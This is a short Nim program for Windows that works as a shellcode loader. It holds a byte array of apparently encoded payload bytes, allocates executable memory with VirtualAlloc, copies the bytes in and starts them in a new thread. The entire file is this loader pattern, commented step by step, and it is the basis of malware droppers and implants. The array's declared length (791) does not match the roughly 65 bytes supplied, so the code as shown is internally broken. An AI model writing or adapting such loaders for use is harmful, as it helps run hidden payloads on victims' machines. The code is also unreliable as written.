import winim/lean

when defined(windows): #Checks whether this Nim code is being compiled on Windows
    var shellcode: array[791, byte] = [
        byte 0x07,0x4e,0xaf,0x7d,0x48,0xd6,0x6e,0x46,0x8e,
0x9f,0xe7,0xf4,0xdb,0x16,0x50,0xcf,0x34,0xad,0x71,0x7d,0x70,0x9f,0xa9,0x86,
0x8e,0x40,0x32,0xbc,0x11,0x5b,0x89,0x03,0x4e,0xcb,0x55,0x92,0x19,0x98,0xe1,
0x87,0x4d,0x3a,0x27,0x81,0x40,0xc7,0x6a,0xde,0xe4,0xbf,0xbe,0xbd,0x55,0x5d,
0x59,0x33,0x2c,0xe9,0x18,0x21,0x92,0x9f,0xa9,0x86,0x8e]

    let shellCodePtr = VirtualAlloc(nil,cast[SIZE_T](shellcode.len), MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

    copyMem(shellCodePtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))     # Copy Shellcode to the allocated memory section
    let tHandle = CreateThread(cast[LP_SECURITY_ATTRIBUTES](0), cast[SIZE_T](shellcode.len),cast[LPTHREAD_START_ROUTINE](shellCodePtr),cast[LPVOID](0),cast[DWORD](0),cast[LPDWORD](0)) # Run shell code 
    WaitForSingleObject(cast[HANDLE](tHandle), cast[DWORD](0xFFFFFFFF))